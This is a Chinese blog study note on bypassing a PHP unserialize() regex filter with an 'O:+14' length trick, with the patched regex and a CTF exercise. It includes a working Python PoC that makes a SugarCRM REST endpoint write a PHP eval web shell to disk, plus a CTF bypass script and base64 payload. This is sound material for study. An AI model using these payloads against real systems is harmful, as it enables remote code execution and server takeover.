# 原创
：  PHP序列化与反序列化记录

# PHP序列化与反序列化记录

### **(1): preg_match(’/[oc]:\d+:/i’, $value, $matches);**

在include/utils.php类有sugar_unserialize方法

```
function sugar_unserialize($value)
{
    preg_match('/[oc]:\d+:/i', $value, $matches);

    if (count($matches)) {
        return false;
    }

    return unserialize($value);
}

```

可以看对序列化的字符串进行了过滤，其实主要过滤的就是禁止Object类型被反序列化。虽然这样看起是没有问题的，但是由于PHP的一个BUG，导致仍然可以被绕过。只需要在对象长度前添加一个+号，即o:14-&gt;o:+14，这样就可以绕过正则匹配。关于这个BUG的具体分析，可以参见php反序列unserialize的一个小特性。<br/> 最后的PoC就是

```
import requests

url = "http://localhost/sugar/service/v4/rest.php"
data = {
    'method':'login',
    'input_type':'Serialize',
    'rest_data':'O:+14:"SugarCacheFile":4:{S:17:"\\00*\\00_cacheFileName";S:15:"../custom/1.php";S:14:"\\00*\\00_localStore";a:1:{i:0;S:26:"&lt;?php eval($_POST[\'1\']);?&gt;";}S:16:"\\00*\\00_cacheChanged";b:1;}'
}

requests.post(url,data=data)

```

修复<br/> 这个漏洞是知道5.6.24版本才进行修复的，修复的方式也是十分的简单<br/> 在这个版本中，上述的PoC已经不能够使用了。以下是修复代码<br/> 在include/utils.php类有sugar_unserialize方法

```
function sugar_unserialize($value)
{
    preg_match('/[oc]:[^:]*\d+:/i', $value, $matches);

    if (count($matches)) {
        return false;
    }

    return unserialize($value);
}

```

可以看到，正则表达式已经变为/[oc]:[^:]*\d+:/i，那么通过+好来进行绕过的方式已经不适用了，这样就修复了这个漏洞了<br/> [参考链接](https://blog.spoock.com/2016/11/03/php-wakeup/)<br/> 一道例题：[链接](https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1)

```
&lt;?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this-&gt;file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this-&gt;file, true); 
    }
    function __wakeup() { 
        if ($this-&gt;file != 'index.php') { 
            //the secret is in the fl4g.php
            $this-&gt;file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?&gt;

```

绕过：

```
&lt;?php
class Demo{
    private $file = 'fl4g.php';
}
$a = serialize(new Demo);
$a = str_replace('O:4', 'O:+4', $a);
$a = str_replace(':1:', ':2:', $a);

echo base64_encode($a);
?&gt;

```

playload：`?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`
